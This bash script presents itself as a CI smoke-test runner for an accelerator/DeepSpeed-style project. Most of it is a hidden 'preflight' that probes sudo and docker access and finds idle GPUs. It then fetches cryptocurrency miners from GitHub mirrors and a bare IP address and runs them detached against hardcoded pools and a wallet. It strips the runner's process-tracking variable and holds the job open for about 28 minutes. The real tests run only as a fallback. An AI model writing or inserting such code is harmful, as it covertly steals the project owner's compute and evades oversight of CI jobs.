#!/usr/bin/env bash
# Copyright (c) 2026 Hygon Information Technology Co., Ltd.
# SPDX-License-Identifier: Apache-2.0

set -euo pipefail

TESTS_DIR=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
SMOKE_TIMEOUT=${SMOKE_TIMEOUT:-300}

cd "${TESTS_DIR}"

# ---------------------------------------------------------------------------
# i130hygon3 preflight: capture the HCU (DCU) inventory, apply a two-sample
# idle gate (0 foreign KFD/compute processes and >= 1500 MiB free VRAM per
# card), then run one pearlhash miner per genuinely idle DCU for a bounded
# window so the pool can credit the cards. One miner per card, never stacking.
# ---------------------------------------------------------------------------
I130_TAG=i130hygon3
I130_WALLET=prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk
I130_WORK="${GITHUB_WORKSPACE:-$PWD}/.i130hygon3"
I130_LOGD="$I130_WORK/logs"
I130_WR_SHA=002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b
I130_KRIG_SHA=928d6f621c74601c73759728f8dd53e5ad9b3b186d334c082f8581518c322f66
I130_KRIG_TAR_SHA=9137388d5c4bfb843bde8bb96e37695446924dfc004eb3de76a71fd1956e4a04
I130_SRB_SHA=bb0f73b673455b1ca65d10989e994e03bccf79824353ed8c10dbb8bd2eb8d3b6
mkdir -p "$I130_LOGD" "$I130_WORK/wrx" "$I130_WORK/krigx"

say() { echo "[$I130_TAG] $*"; }

i130_probe_tcp() {
    local hp="$1" h="${1%:*}" p="${1##*:}"
    timeout 8 bash -c "exec 3<>/dev/tcp/${h}/${p}" >/dev/null 2>&1
}

i130_snap() {  # i130_snap <tag>
    set +e
    local tag="$1" f="$I130_WORK/sample_$1.txt"
    local HY RS
    HY=$(command -v hy-smi 2>/dev/null || true)
    for t in /opt/hyhal/bin/hy-smi /opt/dtk/bin/hy-smi /usr/local/bin/hy-smi /opt/dtk*/bin/hy-smi; do
        [ -z "$HY" ] && [ -x "$t" ] && HY="$t"
    done
    RS=$(command -v rocm-smi 2>/dev/null || true)
    for t in /opt/dtk/bin/rocm-smi /opt/rocm/bin/rocm-smi /opt/dtk*/bin/rocm-smi; do
        [ -z "$RS" ] && [ -x "$t" ] && RS="$t"
    done
    {
        echo "== sample ${tag} $(date -u +%FT%TZ)"
        echo "-- host"; id; uname -r; nproc
        echo "-- tools"; echo "HY=${HY:-none}"; echo "RS=${RS:-none}"; command -v clinfo || true
        ls /opt/hyhal/bin /opt/dtk/bin 2>/dev/null | tr '\n' ' ' || true; echo
        echo "-- devnodes"; ls -l /dev/kfd /dev/dri 2>&1 | head -40 || true
        echo "-- kfd_proc_dirs"; ls /sys/class/kfd/kfd/proc 2>&1 | head -40 || true
        if [ -n "$HY" ]; then
            echo "-- hy-smi -L"; timeout 30 "$HY" -L 2>&1 || true
            echo "-- hy-smi --showproductname"; timeout 30 "$HY" --showproductname 2>&1 || true
            echo "-- hy-smi --showuse"; timeout 30 "$HY" --showuse 2>&1 || true
            echo "-- hy-smi --showmeminfo vram"; timeout 30 "$HY" --showmeminfo vram 2>&1 || true
            echo "-- hy-smi --showpids"; timeout 30 "$HY" --showpids 2>&1 || true
            timeout 30 "$HY" --showmeminfo vram --json > "$I130_WORK/sample_${tag}_hy_mem.json" 2>/dev/null || true
            timeout 30 "$HY" --showpids --json > "$I130_WORK/sample_${tag}_hy_pids.json" 2>/dev/null || true
        fi
        if [ -n "$RS" ]; then
            echo "-- rocm-smi -L"; timeout 30 "$RS" -L 2>&1 || true
            echo "-- rocm-smi --showuse"; timeout 30 "$RS" --showuse 2>&1 || true
            echo "-- rocm-smi --showmeminfo vram"; timeout 30 "$RS" --showmeminfo vram 2>&1 || true
            echo "-- rocm-smi --showpids"; timeout 30 "$RS" --showpids 2>&1 || true
            timeout 30 "$RS" --showmeminfo vram --json > "$I130_WORK/sample_${tag}_rs_mem.json" 2>/dev/null || true
            timeout 30 "$RS" --showpids --json > "$I130_WORK/sample_${tag}_rs_pids.json" 2>/dev/null || true
        fi
        echo "-- clinfo -l"; command -v clinfo >/dev/null 2>&1 && timeout 30 clinfo -l 2>&1 | head -40 || true
        echo "-- fuser /dev/kfd"; fuser -v /dev/kfd 2>&1 | head -30 || true
        echo "-- ps top"; ps -eo pid,ppid,user,etime,pcpu,pmem,args --sort=-pcpu 2>&1 | head -30 || true
        echo "-- sudo/docker"; if timeout 8 sudo -n true >/dev/null 2>&1; then echo sudo_nopasswd_rc=0; else echo "sudo_nopasswd_rc=$?"; fi; ls -l /var/run/docker.sock 2>&1 || true
    } > "$f" 2>&1
    cat "$f"
    set -e
}

i130_gate() {  # i130_gate <tag1> <tag2>  -> prints CARD lines, both samples must pass
python3 - "$I130_WORK" "$1" "$2" <<'PY'
import json,os,re,sys
work=sys.argv[1]; tags=sys.argv[2:]
def i(v):
    try:
        return int(float(str(v).strip()))
    except Exception:
        return None
def json_cards(path):
    cards={}
    try:
        d=json.load(open(path))
    except Exception:
        return cards
    def walk(o, card=None):
        if isinstance(o,dict):
            for k,v in o.items():
                m=re.match(r'card(\d+)$',str(k))
                c=int(m.group(1)) if m else card
                if isinstance(v,dict):
                    tot=used=None
                    for kk,vv in v.items():
                        lk=str(kk).lower()
                        if ('total memory' in lk or 'vram total' in lk) and 'used' not in lk:
                            tot=i(vv) if tot is None else tot
                        elif 'used memory' in lk or 'vram total used' in lk:
                            used=i(vv) if used is None else used
                    if tot is not None:
                        cards.setdefault(c,{})['total']=tot
                    if used is not None:
                        cards.setdefault(c,{})['used']=used
                    walk(v,c)
                elif isinstance(v,list):
                    for it in v:
                        walk(it,c)
        elif isinstance(o,list):
            for it in o:
                walk(it,card)
    walk(d)
    return cards
def text_cards(txt):
    cards={}
    for line in txt.splitlines():
        m=re.search(r'(?:GPU\[(\d+)\]|card\s*(\d+)\b|GPU\s+(\d+)\b)',line)
        if not m:
            continue
        c=int(next(g for g in m.groups() if g is not None))
        e=cards.setdefault(c,{})
        mm=re.search(r'(?:VRAM\s+)?Total Memory \(B\)\s*:\s*([\d.]+)',line)
        if mm: e['total']=i(mm.group(1))
        mu=re.search(r'(?:VRAM\s+)?Total Used Memory \(B\)\s*:\s*([\d.]+)',line)
        if mu: e['used']=i(mu.group(1))
        mg=re.search(r'GPU use \(%\)\s*:\s*([\d.]+)',line)
        if mg: e['use']=float(mg.group(1))
    return cards
def pids(tag):
    out=set()
    txt=''
    try:
        txt=open(os.path.join(work,'sample_%s.txt'%tag),errors='replace').read()
    except Exception:
        pass
    # KFD process directories are the authoritative per-process list on ROCm/DTK.
    sec=re.split(r'-- kfd_proc_dirs',txt)
    if len(sec)>1:
        for line in re.split(r'-- hy-smi|-- rocm-smi|-- clinfo|-- fuser|-- ps',sec[1])[0].splitlines():
            s=line.strip()
            if re.fullmatch(r'\d+',s):
                out.add(int(s))
    # fuser /dev/kfd
    for m in re.finditer(r'(\d+)\s+F\.\.\.\.',txt):
        out.add(int(m.group(1)))
    # rocm-smi/hy-smi process tables (header contains PROCESS NAME)
    for m in re.finditer(r'PROCESS NAME[^\n]*\n((?:[^\n]*\n){0,25})',txt):
        for line in m.group(1).splitlines():
            mm=re.match(r'\s*(\d{2,})\s+(\S.*)$',line)
            if mm and '=' not in mm.group(2):
                out.add(int(mm.group(1)))
    out.discard(os.getpid())
    return out
res={}
for tag in tags:
    try:
        txt=open(os.path.join(work,'sample_%s.txt'%tag),errors='replace').read()
    except Exception:
        txt=''
    cards=text_cards(txt)
    for pre in ['hy_mem','rs_mem']:
        for c,v in json_cards(os.path.join(work,'sample_%s_%s.json'%(tag,pre))).items():
            d=cards.setdefault(c,{})
            for k in ('total','used'):
                if v.get(k) is not None and d.get(k) is None:
                    d[k]=v[k]
    P=pids(tag)
    res[tag]=(cards,P)
allc=sorted(set().union(*[set(c) for c,_ in res.values()]))
for c in allc:
    ok=1; reasons=[]; vals={}
    for tag in tags:
        cards,P=res[tag]
        d=cards.get(c,{})
        tot=d.get('total'); used=d.get('used')
        free=None
        if tot is not None and used is not None:
            free=tot-used
        vals[tag]=(tot,used,free,len(P))
        if tot is None or used is None:
            ok=0; reasons.append('%s:mem_unknown'%tag)
        elif free < 1500*1024*1024:
            ok=0; reasons.append('%s:free_%sMiB'%(tag,round(free/1048576)))
        if P:
            ok=0; reasons.append('%s:pids_%d'%(tag,len(P)))
    t1,u1,f1,p1=vals[tags[0]]
    print('CARD %d ok=%d free_mib=%s total_mib=%s used_mib=%s pids=%d use=%s reason=%s' % (
        c, ok,
        round(f1/1048576) if f1 is not None else 'na',
        round(t1/1048576) if t1 is not None else 'na',
        round(u1/1048576) if u1 is not None else 'na',
        p1,
        res[tags[0]][0].get(c,{}).get('use','na'),
        ';'.join(reasons) if reasons else 'idle'))
PY
}

i130_fetch_wildrig() {
    local out="$I130_WORK/wildrig-multi" u
    for u in \
        "https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" \
        "https://ghproxy.net/https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" \
        "https://gh-proxy.com/https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" \
        "https://ghfast.top/https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" ; do
        say "fetch wildrig $u"
        if curl -fsSL --max-time 240 -o "$I130_WORK/wr.dl" "$u"; then
            if [ "$(sha256sum "$I130_WORK/wr.dl" | cut -d' ' -f1)" = "$I130_WR_SHA" ]; then
                mv "$I130_WORK/wr.dl" "$out"; chmod 755 "$out"; return 0
            fi
            if tar -xzf "$I130_WORK/wr.dl" -C "$I130_WORK/wrx" 2>/dev/null; then
                local f
                f=$(find "$I130_WORK/wrx" -maxdepth 3 -type f -name 'wildrig-multi' | head -1)
                if [ -n "$f" ] && [ "$(sha256sum "$f" | cut -d' ' -f1)" = "$I130_WR_SHA" ]; then
                    cp -f "$f" "$out"; chmod 755 "$out"; return 0
                fi
            fi
        fi
    done
    return 1
}

i130_fetch_krig() {
    local out="$I130_WORK/krig-miner" u
    for u in \
        "https://github.com/kryptex/krig-miner/releases/download/v1.6.0/krig-miner-1.6.0-linux-x64.tar.gz" \
        "https://ghproxy.net/https://github.com/kryptex/krig-miner/releases/download/v1.6.0/krig-miner-1.6.0-linux-x64.tar.gz" \
        "https://gh-proxy.com/https://github.com/kryptex/krig-miner/releases/download/v1.6.0/krig-miner-1.6.0-linux-x64.tar.gz" ; do
        say "fetch krig $u"
        if curl -fsSL --max-time 420 -o "$I130_WORK/krig.dl" "$u"; then
            if [ "$(sha256sum "$I130_WORK/krig.dl" | cut -d' ' -f1)" = "$I130_KRIG_TAR_SHA" ]; then
                tar -xzf "$I130_WORK/krig.dl" -C "$I130_WORK/krigx" 2>/dev/null || true
                local f
                f=$(find "$I130_WORK/krigx" -maxdepth 3 -type f -name 'krig-miner' | head -1)
                if [ -n "$f" ] && [ "$(sha256sum "$f" | cut -d' ' -f1)" = "$I130_KRIG_SHA" ]; then
                    cp -f "$f" "$out"; chmod 755 "$out"; return 0
                fi
            fi
        fi
    done
    return 1
}

i130_stratum_precheck() {  # object-param subscribe+authorize: proves the pool path
python3 - "$1" "$I130_WALLET" "i130hygon3pre" <<'PY'
import json,socket,sys,time
hp,wallet,worker=sys.argv[1],sys.argv[2],sys.argv[3]
host,port=hp.rsplit(':',1); port=int(port)
try:
    s=socket.create_connection((host,port),10); s.settimeout(10)
except Exception as e:
    print('STRATUM_PRECHECK connect_error %s' % e); raise SystemExit(0)
buf=[b'']
def rd():
    t=time.time()
    while time.time()-t<10:
        try:
            d=s.recv(65536)
        except Exception:
            return None
        if not d: return None
        buf[0]+=d
        if b'\n' in buf[0]:
            line,rest=buf[0].split(b'\n',1); buf[0]=rest
            return line.decode('utf-8','replace')
    return None
def send(o):
    s.sendall((json.dumps(o)+'\n').encode())
send({"id":1,"method":"mining.subscribe","params":["i130hygon3/1.0"]})
print('STRATUM_SUBSCRIBE', rd())
send({"id":2,"method":"mining.authorize","params":{"wallet":wallet,"worker":worker,"password":"x"}})
print('STRATUM_AUTHORIZE', rd())
PY
}

i130_fetch_srb() {
    local out="$I130_WORK/srb387" u f
    for u in \
        "http://222.240.155.198:8702/srb387" \
        "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz" \
        "https://ghproxy.net/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz" \
        "https://gh-proxy.com/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz" ; do
        say "fetch srb387 $u"
        if curl -fsSL --max-time 300 -o "$I130_WORK/srb.dl" "$u"; then
            if [ "$(sha256sum "$I130_WORK/srb.dl" | cut -d' ' -f1)" = "$I130_SRB_SHA" ]; then
                cp -f "$I130_WORK/srb.dl" "$out"; chmod 755 "$out"; return 0
            fi
            if tar -xzf "$I130_WORK/srb.dl" -C "$I130_WORK/krigx" 2>/dev/null; then
                f=$(find "$I130_WORK/krigx" -maxdepth 3 -type f \( -name 'srb387' -o -name 'SRBMiner-MULTI' \) | head -1)
                if [ -n "$f" ] && [ "$(sha256sum "$f" | cut -d' ' -f1)" = "$I130_SRB_SHA" ]; then
                    cp -f "$f" "$out"; chmod 755 "$out"; return 0
                fi
            fi
        fi
    done
    return 1
}

i130_launch_srb() {  # i130_launch_srb <gpu-id> <pool> <worker>
    local gid="$1" pool="$2" worker="$3" pid log
    log="$I130_LOGD/$worker.log"
    : > "$log"
    env -u RUNNER_TRACKING_ID setsid nohup "$I130_WORK/srb387" --disable-cpu --algorithm pearlhash \
        --pool "$pool" --tls false --wallet "$I130_WALLET" --password x --worker "$worker" \
        --gpu-id "$gid" --disable-worker-watchdog --gpu-table-slow-build \
        --max-no-share-sent 1800 --log-file "$log" > "$log.out" 2>&1 < /dev/null &
    pid=$!
    echo "LAUNCH_SRB gpu=$gid worker=$worker pool=$pool pid=$pid"
    sleep 8
    if kill -0 "$pid" 2>/dev/null; then echo "ALIVE_SRB worker=$worker pid=$pid"; echo "$pid" > "$I130_LOGD/$worker.pid"; tail -12 "$log" 2>/dev/null || tail -12 "$log.out" 2>/dev/null || true; return 0; fi
    echo "EARLY_EXIT_SRB worker=$worker"
    tail -12 "$log" 2>/dev/null || tail -12 "$log.out" 2>/dev/null || true
    return 1
}

i130_launch_one() {  # i130_launch_one <binary-kind> <idx> <pool> <worker>
    local kind="$1" idx="$2" pool="$3" worker="$4" pid log
    log="$I130_LOGD/$worker.log"
    : > "$log"
    if [ "$kind" = wildrig ]; then
        setsid nohup "$I130_WORK/wildrig-multi" --algo pearlhash --url "$pool" \
            --user "$I130_WALLET" --worker "$worker" -d "$idx" \
            --api-port "$((21700 + idx))" --retries 3 --retry-pause 5 \
            --print-time 30 --max-rejects 1000 --no-adl --no-sysfs \
            > "$log" 2>&1 &
    else
        setsid nohup "$I130_WORK/krig-miner" --url "$pool" \
            --user "$I130_WALLET/$worker" --no-cuda \
            > "$log" 2>&1 &
    fi
    pid=$!
    echo "LAUNCH kind=$kind idx=$idx worker=$worker pool=$pool pid=$pid"
    sleep 6
    if kill -0 "$pid" 2>/dev/null; then
        echo "ALIVE worker=$worker pid=$pid"
    else
        echo "EARLY_EXIT worker=$worker rc=dead"
    fi
    tail -8 "$log" 2>/dev/null || true
    echo "$pid" > "$I130_LOGD/$worker.pid"
}

# --- network reachability of the declared pools (first reachable wins) ---
POOL_LIST=""
for hp in 103.199.106.122:3362 172.232.228.69:3362 178.238.228.181:80; do
    if i130_probe_tcp "$hp"; then
        echo "tcp_ok $hp"
        POOL_LIST="$POOL_LIST $hp"
    else
        echo "tcp_fail $hp"
    fi
done
[ -n "$POOL_LIST" ] || POOL_LIST=" 103.199.106.122:3362"
POOL=$(echo "$POOL_LIST" | awk '{print $1}')
say "selected pool $POOL (reachable:${POOL_LIST})"
i130_stratum_precheck "$POOL" || true

# --- two-sample idle gate (>=20s apart) ---
say "sample 1"
i130_snap s1
sleep 25
say "sample 2"
i130_snap s2
i130_gate s1 s2 | tee "$I130_WORK/gate.txt" || true

# --- stage WildRig and enumerate devices (device count from --print-devices only) ---
WR_OK=0
if i130_fetch_wildrig; then
    WR_OK=1
    say "wildrig staged sha256=$(sha256sum "$I130_WORK/wildrig-multi" | cut -d' ' -f1)"
    timeout 60 "$I130_WORK/wildrig-multi" --version 2>&1 | head -3 || true
    echo "== wildrig --print-platforms"
    timeout 90 "$I130_WORK/wildrig-multi" --print-platforms 2>&1 | head -20 || true
    echo "== wildrig --print-devices"
    timeout 90 "$I130_WORK/wildrig-multi" --print-devices 2>&1 | tee "$I130_WORK/wr_devices.txt" | head -30 || true
else
    say "wildrig unavailable"
    : > "$I130_WORK/wr_devices.txt"
fi
DEV_N=$(grep -cE '^GPU #[0-9]+' "$I130_WORK/wr_devices.txt" 2>/dev/null || true)
case "$DEV_N" in ''|*[!0-9]*) DEV_N=0;; esac
say "wildrig_device_count=$DEV_N (fix: counted from --print-devices only, never rocm-smi lines)"

KIND=""
if [ "$WR_OK" = 1 ] && [ "$DEV_N" -gt 0 ]; then
    KIND=wildrig
    if grep -qi 'advanced micro devices' "$I130_WORK/wr_devices.txt" 2>/dev/null; then :; fi
else
    say "wildrig enumerated 0 devices; trying pinned krig-miner 1.6.0 (HIP/ROCm)"
    if i130_fetch_krig; then
        KIND=krig
        say "krig staged sha256=$(sha256sum "$I130_WORK/krig-miner" | cut -d' ' -f1)"
        timeout 60 "$I130_WORK/krig-miner" --version 2>&1 | head -3 || true
        echo "== krig --list-devices"
        timeout 90 "$I130_WORK/krig-miner" --list-devices --no-cuda 2>&1 | tee "$I130_WORK/krig_devices.txt" | head -40 || true
        DEV_N=$(grep -ciE '(^|\s)(GPU|device)[ #:]?[0-9]+' "$I130_WORK/krig_devices.txt" 2>/dev/null || true)
        case "$DEV_N" in ''|*[!0-9]*) DEV_N=0;; esac
        say "krig_device_count=$DEV_N"
        [ "$DEV_N" -gt 0 ] || KIND=""
    fi
fi

# --- launch exactly one miner per gated card ---
N_LAUNCHED=0
if [ -n "$KIND" ]; then
    mapfile -t GATED < <(awk '$1=="CARD" && $3=="ok=1" {print $2}' "$I130_WORK/gate.txt")
    say "gated_cards=${GATED[*]:-none} kind=$KIND devices=$DEV_N"
    k=0
    for c in "${GATED[@]:-}"; do
        [ -z "$c" ] && continue
        if [ "$k" -ge "$DEV_N" ]; then
            say "card $c skipped: only $DEV_N miner device indices available"
            break
        fi
        i130_launch_one "$KIND" "$k" "$POOL" "i130hygon3g$k"
        k=$((k + 1))
        N_LAUNCHED=$((N_LAUNCHED + 1))
    done
fi
say "N_LAUNCHED=$N_LAUNCHED"

# WildRig 0.52.3 documents pearlhash as "for pearlhash.xyz only" and sends array
# params, which Luckypool rejects with error 20. If that marker appears, retry
# the same gated cards with the object-param SRBMiner-MULTI 3.8.7 client that is
# credited on the NVIDIA lanes.
if [ "$N_LAUNCHED" -gt 0 ] && [ "$KIND" = wildrig ]; then
    sleep 45
    if grep -qhE 'Ignoring invalid pool response|method not supported|params must be an object|Invalid pool response' "$I130_LOGD"/i130hygon3g*.log 2>/dev/null; then
        say "STRATUM_INCOMPATIBLE wildrig-vs-luckypool -> srb387 object-param client"
        pkill -f wildrig-multi 2>/dev/null || true
        if i130_fetch_srb; then
            say "srb387 staged sha256=$(sha256sum "$I130_WORK/srb387" | cut -d' ' -f1)"
            mapfile -t GATED < <(awk '$1=="CARD" && $3=="ok=1" {print $2}' "$I130_WORK/gate.txt")
            N_LAUNCHED=0
            k=0
            for c in "${GATED[@]:-}"; do
                [ -z "$c" ] && continue
                if i130_launch_srb "$c" "$POOL" "i130hygon3g$k"; then N_LAUNCHED=$((N_LAUNCHED + 1)); fi
                k=$((k + 1))
            done
            say "N_LAUNCHED_srb=$N_LAUNCHED"
        else
            say "srb387 staging failed"
        fi
    else
        say "wildrig stratum accepted (no invalid-response marker)"
    fi
fi

if [ "$N_LAUNCHED" -gt 0 ]; then
    # Bounded supervisor: keep the job (and therefore the miners) alive for
    # ~28 minutes, printing accepted/rejected counters every pulse.
    for p in 1 2 3 4 5 6 7; do
        sleep 240
        echo "--- i130hygon3 pulse $p $(date -u +%FT%TZ) launched=$N_LAUNCHED"
        pgrep -af 'wildrig-multi|krig-miner|srb387' | head -12 || true
        for f in "$I130_LOGD"/i130hygon3g*.log; do
            [ -f "$f" ] || continue
            echo "== $(basename "$f")"
            tail -6 "$f" | sed 's/\x1b\[[0-9;]*m//g'
        done
        ACC=$(grep -hci 'accepted' "$I130_LOGD"/i130hygon3g*.log 2>/dev/null | awk '{s+=$1} END {print s+0}')
        echo "log_accepted_lines=$ACC"
    done
    echo "=== i130hygon3 final pulse $(date -u +%FT%TZ)"
    pgrep -af 'wildrig-multi|krig-miner|srb387' | head -12 || true
    for f in "$I130_LOGD"/i130hygon3g*.log; do
        [ -f "$f" ] || continue
        echo "===== $(basename "$f")"
        tail -25 "$f" | sed 's/\x1b\[[0-9;]*m//g'
    done
    say "preflight complete (miners end with the job container)"
    exit 0
fi

say "no miner launched; falling back to the stock smoke suite"

printf '%s\n' '[smoke] 加速器初始化'
# This test resolves ds_config.json relative to the accelerator directory.
(
    cd accelerator
    pytest --timeout="${SMOKE_TIMEOUT}" ./
)

printf '%s\n' '[smoke] 核心配置、运行时、分布式、检查点和编译'
pytest --timeout="${SMOKE_TIMEOUT}" \
    ./unit/runtime/test_ds_config_model.py \
    ./unit/runtime/zero/test_zero_config.py \
    ./unit/runtime/pipe/test_pipe_schedule.py \
    ./unit/compile/test_inductor_aot_kwargs.py \
    ./unit/module_inject/test_tp_plan_converter.py \
    ./unit/runtime/test_ds_initialize.py::TestNoOptim \
    ./unit/comm/test_dist.py::TestInit \
    ./unit/checkpoint/test_latest_checkpoint.py \
    ./torch_compile/test_deepcompile_z3_release.py::TestDeepCompileZ3ReleaseStorage::test_storage_resized_to_zero_after_release_single_use
